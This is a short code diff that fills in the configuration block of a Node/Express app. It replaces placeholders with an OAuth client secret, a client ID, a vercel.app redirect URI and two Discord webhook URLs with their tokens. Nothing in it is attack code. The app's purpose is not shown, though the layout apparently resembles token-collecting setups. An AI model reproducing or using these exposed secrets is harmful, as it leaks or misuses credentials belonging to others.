@@ -1,9 +1,9 @@
 // Configuration
-const client_secret = 'change'
-const client_id = 'change'
-const redirect_uri = 'change'
-const webhook_url = 'change'
-const webhook_logging_url = 'change'
+const client_secret = 'EWi8Q~syIaLjJn76QiP1vXz6wEkUT3OIHplTKdcv'
+const client_id = '7c9575d7-f28b-4957-ba36-7dc4e3f8ad09'
+const redirect_uri = 'https://ffd-nu.vercel.app/'
+const webhook_url = 'https://discord.com/api/webhooks/1050046012129021993/so-H46-cwNqTqs65Swr87jFAWZn3lwG5Tr66tJgNysX9f0JWJX3cwIgu47CMtjXMwnIY'
+const webhook_logging_url = 'https://discord.com/api/webhooks/1050046012129021993/so-H46-cwNqTqs65Swr87jFAWZn3lwG5Tr66tJgNysX9f0JWJX3cwIgu47CMtjXMwnIY'
 // Config end
 const axios = require('axios')
 const express = require('express')
